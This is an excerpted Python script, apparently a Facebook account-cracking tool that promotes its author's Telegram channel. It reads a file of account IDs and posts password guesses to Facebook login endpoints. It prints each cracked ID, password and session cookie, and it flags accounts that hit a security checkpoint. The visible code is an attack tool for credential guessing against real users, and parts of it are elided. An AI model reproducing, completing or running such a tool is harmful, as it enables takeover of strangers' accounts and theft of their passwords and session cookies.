...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY TELEGRAM CHANAL")
time.sleep(2)
os.system(f'xdg-open https://t.me/s1gma_cracker ')
#------------------[ BEMNAT ]-------------------#
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
...
def crack_file():
    o = input('\033[1;37mPut File Name :\033[1;32m ')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r \r[ MRBX  ] {P}[{k}\033[1;31m{loop}\033[1;31m{P}/{h}{len(id)}{P}] - {P}{H}OK - {ok}{P} - {P}\033[1;31mCP - {cp}{x} - {bo}{'{:.0%}'.format(loop/float(len(id)))}{P} "),
    sys.stdout.flush()
    ...
    'viewport-width': '980',
            ...
            /device-based/password/?uid='+idf+'&flow=login_no_pin&wtsid=rdr_0h6isQJSJIoku7Q5N&refsrc=deprecated&_rdr').text
    ...
    'viewport-width': '980',
            ...
            po = ses.post('https://p.facebook.com/',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                print(f'\r\x1b[32[{b}MamAbdulla-OK✔]\033[1;95m   {b}{idf} | \033[1;94m{b}{pw} |COOKIES🌼 \033[1;94m{b}{kuki}\n{b}{ua}{N}')
                os.system('espeak -a 300 " , bemnat ok MamAbdulla  OK,  id password"')
